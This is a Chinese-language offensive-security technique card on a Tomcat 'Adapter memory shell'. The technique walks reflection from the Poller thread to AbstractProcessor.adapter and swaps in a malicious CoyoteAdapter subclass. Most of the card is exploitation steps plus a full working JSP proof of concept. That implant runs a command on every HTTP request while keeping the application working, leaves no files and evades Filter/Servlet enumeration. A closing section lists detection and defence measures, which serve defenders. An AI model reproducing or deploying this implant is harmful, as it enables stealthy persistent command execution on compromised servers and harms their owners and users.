---
id: web-java-component-tomcat-adapter-memshell
title: Tomcat Adapter 内存马：替换 AbstractProcessor.adapter 的 CoyoteAdapter
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-coyote-adapter-memshell
aliases:
- Tomcat Adapter 内存马
- CoyoteAdapter 替换
- AbstractProcessor.adapter 注入
- EvilAdapter 内存马
- Connector 层内存马
tags:
- java
- tomcat
- memshell
- adapter
- coyote
- persistence
- reflection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:00:02+08:00'
  notes: 已对照原文与本地截图核对：Adapter对象链、EvilAdapter继承CoyoteAdapter、connector字段获取与adapterField.set替换均与原文PoC一致；原文未给受影响版本区间（仅调试环境9.0.111），未设置versions；PoC未在本机复现，Adapter节个别截图为外链未本地核对
---

## 一句话结论

在已能执行一次 Java/JSP 代码的 Tomcat NIO 中，可通过反射从 Poller 线程拿到 `NioEndpoint`，再沿 `connections → NioSocketWrapper → socket → appReadBufHandler → request → hook(Http11Processor) → AbstractProcessor.adapter` 找到当前连接的 `CoyoteAdapter`，把 `adapter` 字段替换为继承 `CoyoteAdapter` 的恶意子类；其 `service()` 在每个请求进入容器前执行命令、再调用 `super.service()` 保持业务正常，形成 Connector 层、无文件、重启前持续的 Adapter 内存马。

## 原理

- **Adapter 的位置**：Tomcat 的 Connector 内部由 `ProtocolHandler`（Endpoint + Processor）处理网络与协议，`Processor` 把字节解析成 Coyote `Request`，再交给 `Adapter`；`CoyoteAdapter.service()` 把 Coyote Request/Response 适配成 ServletRequest/Response 并调用容器 `service()`。因此 Adapter 位于“协议处理之后、容器之前”，对所有请求生效。
- **对象链**：
  1. `Thread.currentThread().getThreadGroup().getDeclaredField("threads")` 取线程数组，找名字含 `Poller` 的线程；
  2. `Thread.target` 是 `NioEndpoint$Poller`，其外部类引用字段 `this$0` 即 `NioEndpoint`；
  3. `NioEndpoint` 的父类父类（`AbstractEndpoint`）有 `connections` Map（`NioSocketWrapper` → 连接）；
  4. 取任意 `socketWrapper.getSocket()`，再取 `appReadBufHandler` 字段、其 `request` 字段（Coyote Request），再取 `hook` 字段即 `Http11Processor`；
  5. `Http11Processor` 的父类 `AbstractProcessor` 有 `adapter` 字段（`CoyoteAdapter` 实例）。
- **替换**：反射 `adapterField.set(http11Processor, evilAdapter)`，`evilAdapter` 继承 `CoyoteAdapter`，构造时传入原 adapter 的 `connector` 字段；重写 `service(Request, Response)`，先执行恶意逻辑，再 `super.service(req,res)` 保持原业务。
- **为什么能持久/隐蔽**：Adapter 实例在 Tomcat 启动时创建、之后复用；替换后不落盘、不新增 Servlet/Filter/Valve，常规的 Filter/Servlet/Listener 枚举看不到；每个 HTTP 请求都会触发，且 `super.service` 让业务无感知。重启 Tomcat 后失效。
- **版本差异**：原文调试环境为 Tomcat 9.0.111（`tomcat-coyote:9.0.111`），字段名 `appReadBufHandler`、`hook`、`adapter`、`connections` 均按该版本；Tomcat 10/11 或 NIO2/APR 的类名/字段可能需要调整。
- **与相邻内存马的区别**：Valve 在 Container 层（Engine/Host/Context/Wrapper 的 Pipeline），Filter 在 Servlet 层，Executor 在 Endpoint 线程池；Adapter 在 Connector 的协议适配层，位于 Executor/Processor 之后、Container 之前。

## 触发条件

- 目标为 Tomcat（原文 Tomcat 9.0.111，NIO），攻击者已获得一次 Java/JSP 代码执行能力（JSP 马、反序列化、表达式注入等）。
- 目标存在至少一个活动连接（当前 JSP 请求本身即可），`connections` Map 非空；否则需要等待/制造连接。
- JDK 允许反射访问 `ThreadGroup.threads`、`Thread.target`、`AbstractEndpoint.connections`、`AbstractProcessor.adapter` 等字段（JDK 8 通常可行；JDK 17+ 强封装可能需要额外绕过）。
- 目标未部署拦截 `CoyoteAdapter` 替换/异常 Adapter 类的 RASP。

## 利用步骤

1. 在一个可执行 JSP 中获取当前线程组与 `Poller` 线程，反射取 `Thread.target`，再取 `Poller` 的 `this$0` 得到 `NioEndpoint`。
2. 从 `NioEndpoint` 父类父类取 `connections` Map，遍历任一 `NioSocketWrapper`。
3. 依次取 `getSocket()` → `appReadBufHandler` → `request` → `hook`，得到 `Http11Processor`。
4. 从 `Http11Processor` 的父类 `AbstractProcessor` 取 `adapter` 字段，得到原 `CoyoteAdapter`；反射取原 adapter 的 `connector` 字段。
5. 定义 `EvilAdapter extends CoyoteAdapter`，构造器调用 `super(connector)`，重写 `service()` 执行命令后 `super.service()`。
6. `adapterField.set(http11Processor, new EvilAdapter(connector))`；访问任意 URL 触发，验证命令执行。
7. 清理：重启 Tomcat 或把原 adapter 设置回去。

## PoC

核心 JSP（节选，按原文整理）：

```jsp
<%@ page import="java.lang.reflect.*" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.coyote.http11.Http11Processor" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.catalina.connector.CoyoteAdapter" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.Request" %>
<%@ page import="org.apache.coyote.Response" %>

<%!
    class EvilAdapter extends CoyoteAdapter {
        public EvilAdapter(Connector connector) { super(connector); }
        @Override
        public void service(Request req, Response res) throws Exception {
            Runtime.getRuntime().exec("calc.exe");   // 恶意逻辑
            super.service(req, res);                 // 保持业务
        }
    }
%>

<%
    // 1. 从 Poller 线程拿 NioEndpoint
    ThreadGroup group = Thread.currentThread().getThreadGroup();
    Field threadsField = ThreadGroup.class.getDeclaredField("threads");
    threadsField.setAccessible(true);
    Thread[] threads = (Thread[]) threadsField.get(group);

    Object nioEndpoint = null;
    for (Thread thread : threads) {
        if (thread != null && thread.getName().contains("Poller")) {
            Field targetField = Thread.class.getDeclaredField("target");
            targetField.setAccessible(true);
            Object poller = targetField.get(thread);
            for (Field field : poller.getClass().getDeclaredFields()) {
                if (field.getName().startsWith("this$")) {
                    field.setAccessible(true);
                    nioEndpoint = field.get(poller);
                    break;
                }
            }
            if (nioEndpoint != null) break;
        }
    }

    NioEndpoint endpoint = (NioEndpoint) nioEndpoint;

    // 2. 取 connections Map
    Field connectionsField = endpoint.getClass().getSuperclass().getSuperclass()
        .getDeclaredField("connections");
    connectionsField.setAccessible(true);
    Map<?, ?> connections = (Map<?, ?>) connectionsField.get(endpoint);

    Http11Processor http11Processor = null;
    Adapter adapter = null;
    Field adapterField = null;

    // 3. 沿 socket -> appReadBufHandler -> request -> hook 找到 Http11Processor
    for (Object socketWrapper : connections.values()) {
        Method getSocketMethod = socketWrapper.getClass().getMethod("getSocket");
        Object socket = getSocketMethod.invoke(socketWrapper);

        Field appReadBufHandlerField = socket.getClass().getDeclaredField("appReadBufHandler");
        appReadBufHandlerField.setAccessible(true);
        Object appReadBufHandler = appReadBufHandlerField.get(socket);

        Field requestField = appReadBufHandler.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Object coyoteRequest = requestField.get(appReadBufHandler);

        Field hookField = coyoteRequest.getClass().getDeclaredField("hook");
        hookField.setAccessible(true);
        Object hook = hookField.get(coyoteRequest);

        http11Processor = (Http11Processor) hook;

        Class<?> abstractProcessor = http11Processor.getClass().getSuperclass();
        adapterField = abstractProcessor.getDeclaredField("adapter");
        adapterField.setAccessible(true);
        adapter = (Adapter) adapterField.get(http11Processor);
        break;
    }

    // 4. 取原 adapter 的 connector，替换为恶意 Adapter
    Field connectorField = adapter.getClass().getDeclaredField("connector");
    connectorField.setAccessible(true);
    Connector connector = (Connector) connectorField.get(adapter);

    EvilAdapter evilAdapter = new EvilAdapter(connector);
    adapterField.set(http11Processor, evilAdapter);
%>
```

访问该 JSP 后，再访问任意 URL 触发 `EvilAdapter.service()`。

## 变体与关联

- **Tomcat 10/11**：包名可能从 `javax.servlet` 变为 `jakarta.servlet`，`Http11Processor`/`AbstractProcessor` 字段名大体一致，但需按版本核对；`Nio2Endpoint`/`AprEndpoint` 的 `connections` 字段位置可能不同。
- **JDK 17+**：强封装可能阻止反射访问 `ThreadGroup.threads`/`Thread.target` 等；可用 `Unsafe`/`--add-opens`/其他对象搜索方式替代（见关联卡）。
- **对象搜索工具**：`java-object-searcher` 可从 `Thread.currentThread()` BFS 搜索 `NioEndpoint`/`Http11NioProtocol`/`AjpProcessor`，适合在调试环境快速定位链路字段。
- **与 Valve/Executor/Upgrade 的关系**：同一 Connector/Container 层级的相邻注入点；Adapter 在协议适配层，Valve 在容器 Pipeline，Executor 在线程池，Upgrade 在协议升级分支。可组合使用，检测点不同。
- 关联卡片：[[web-java-component-tomcat-valve-memshell]]、[[web-java-component-tomcat-executor-memshell]]、[[web-java-component-tomcat-upgrade-memshell]]、[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]。

## 检测与防御

- **运行时检测**：枚举 `AbstractProcessor.adapter` 的实际类型，若为业务/自定义 `CoyoteAdapter` 子类而非容器原始类，告警；监控 `adapter` 字段被反射 `set`；检查 Connector 内 `Http11Processor` 实例的类加载器与 `CodeSource`。
- **类/字节码**：搜索继承 `CoyoteAdapter` 且 `service()` 中含 `Runtime.exec`/`ProcessBuilder` 的类；JSP 编译出的类中出现 `AppReadBufHandler`/`hook`/`adapter` 反射链。
- **行为**：每个请求都触发相同子进程/文件写入；业务响应正常但伴随异常命令执行；Tomcat 进程内出现无对应 Web 应用的动态类。
- **防御**：修复上游 JSP 上传/反序列化/表达式注入；部署 RASP/Java Agent 监控 `AbstractProcessor.adapter` 替换与 `CoyoteAdapter` 子类；限制 JSP 执行；重启可清除，但需同时排查持久化入口。
- **排查**：用 arthas/copagent/java-memshell-scanner 检查 Connector/Processor/Adapter；对比 `AbstractProcessor.adapter` 的类名与 Tomcat 原始 `CoyoteAdapter`；检查 Tomcat 日志中的异常类加载。
